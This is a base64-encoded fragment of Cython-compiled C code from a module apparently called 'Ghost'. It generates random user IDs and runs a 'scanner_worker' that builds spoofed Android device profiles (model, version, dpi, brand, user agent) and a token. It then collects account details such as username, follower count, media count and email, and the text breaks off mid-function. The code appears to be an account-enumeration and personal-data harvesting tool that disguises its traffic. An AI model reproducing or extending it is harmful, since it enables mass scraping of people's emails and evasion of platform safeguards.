UHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfNTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5lcmF0ZV91c2VyX2lkIiwgMCk7CgogIAogIF9fcHl4X3RfMSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yNTAwMDAwMDAwOwogIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpOwogIF9fcHl4X3RfMiA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF84NTA3OTQwNjM0OwogIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpOwogIF9fcHl4X3Zfc3RhcnQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzEpOwogIF9fcHl4X3RfMSA9IDA7CiAgX19weXhfdl9lbmQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzIpOwogIF9fcHl4X3RfMiA9IDA7CgogIAogIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgX19weXhfdF8xID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kcmFuZ2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzNzEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3RfNSA9IDE7CiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkgewogICAgX19weXhfdF8xID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTsKICAgIGFzc2VydChfX3B5eF90XzEpOwogICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgX19weXhfdF81ID0gMDsKICB9CiAgI2VuZGlmCiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfMSwgX19weXhfdl9zdGFydCwgX19weXhfdl9lbmR9OwogICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgzLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzNzEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgfQogIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF8yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzcxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF9yID0gX19weXhfdF80OwogIF9fcHl4X3RfNCA9IDA7CiAgZ290byBfX3B5eF9MMDsKCiAgCgogIAogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5nZW5lcmF0ZV91c2VyX2lkIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9zdGFydCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2VuZCk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8yNXNjYW5uZXJfd29ya2VyKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMnRmXzVHaG9zdF8yNXNjYW5uZXJfd29ya2VyID0geyJzY2FubmVyX3dvcmtlciIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnRmXzVHaG9zdF8yNXNjYW5uZXJfd29ya2VyLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0Zl81R2hvc3RfMjVzY2FubmVyX3dvcmtlcihQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKSB7CiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl93b3JrZXJfaWQgPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJzY2FubmVyX3dvcmtlciAod3JhcHBlcikiLCAwKTsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpOwogICNlbHNlCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDsKICAjZW5kaWYKICAjZW5kaWYKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICB7CiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWxmLCZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd29ya2VyX2lkLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDM3MywgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAyOgogICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAzNzMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzNzMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJzY2FubmVyX3dvcmtlciIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzczLCBfX3B5eF9MM19lcnJvcikKICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDI7IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgic2Nhbm5lcl93b3JrZXIiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDM3MywgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAyKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzNzMsIF9fcHl4X0wzX2Vycm9yKQogICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDM3MywgX19weXhfTDNfZXJyb3IpCiAgICB9CiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07CiAgICBfX3B5eF92X3dvcmtlcl9pZCA9IHZhbHVlc1sxXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgic2Nhbm5lcl93b3JrZXIiLCAxLCAyLCAyLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAzNzMsIF9fcHl4X0wzX2Vycm9yKQogIF9fcHl4X0w2X3NraXA6OwogIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7CiAgX19weXhfTDNfZXJyb3I6OwogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5zY2FubmVyX3dvcmtlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMnRmXzVHaG9zdF8yNHNjYW5uZXJfd29ya2VyKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZiwgX19weXhfdl93b3JrZXJfaWQpOwoKICAKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMjRzY2FubmVyX3dvcmtlcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X3dvcmtlcl9pZCkgewogIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJfaWQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X21vZGVsX251bWJlciA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfYW5kcm9pZF92ZXJzaW9uID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9kcGkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3Jlc29sdXRpb24gPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2JyYW5kID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9idWlsZF9zdWZmaXggPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJfYWdlbnQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2xzZF90b2tlbiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfaGVhZGVycyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZGF0YSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJfaW5mbyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcm5hbWUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2ZvbGxvd2VyX2NvdW50ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9tZWRpYV9jb3VudCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZW1haWwgPSBOVUxMOwogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfMzsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF85WzNdOwogIFB5T2JqZWN0ICpfX3B5eF90XzEwWzE1XTsKICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTIgPSBOVUxMOwogIGludCBfX3B5eF90XzEzOwogIGludCBfX3B5eF90XzE0OwogIGludCBfX3B5eF90XzE1OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInNjYW5uZXJfd29ya2VyIiwgMCk7CgogIAogIF9fcHl4X3RfMiA9IF9fcHl4X3Zfc2VsZjsKICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzMgPSAwOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0c307CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzc0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgCiAgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF80LCAmX19weXhfdF81LCAmX19weXhfdF82KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTsKICAgICB7CgogICAgICAKICAgICAgX19weXhfdF8yID0gX19weXhfdl9zZWxmOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICAgICAgX19weXhfdF8zID0gMDsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIE5VTEx9OwogICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5lcmF0ZV91c2VyX2lkLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgxLV9fcHl4X3RfMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzc2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgfQogICAgICBfX3B5eF92X3VzZXJfaWQgPSBfX3B5eF90XzE7CiAgICAgIF9fcHl4X3RfMSA9IDA7CgogICAgICAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNzcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzc3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzc3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM3NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgX19weXhfdl9tb2RlbF9udW1iZXIgPSAoKFB5T2JqZWN0KilfX3B5eF90XzIpOwogICAgICBfX3B5eF90XzIgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMSA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzc4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzc4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNyA9IFB5TGlzdF9OZXcoNik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM3OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yM182XzApOwogICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjNfNl8wKTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzcsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjNfNl8wKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNzksIF9fcHl4X0wzX2Vycm9yKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjRfN18wKTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI0XzdfMCk7CiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF83LCAxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI0XzdfMCkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzc5LCBfX3B5eF9MM19lcnJvcik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI1XzdfMV8xKTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI1XzdfMV8xKTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzcsIDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjVfN18xXzEpICE9ICgwKSkgX19QWVhfRVJSKDAsIDM3OSwgX19weXhfTDNfZXJyb3IpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yNl84XzApOwogICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjZfOF8wKTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzcsIDMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjZfOF8wKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNzksIF9fcHl4X0wzX2Vycm9yKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjdfOF8xKTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI3XzhfMSk7CiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF83LCA0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI3XzhfMSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzc5LCBfX3B5eF9MM19lcnJvcik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI4XzlfMCk7CiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yOF85XzApOwogICAgICBp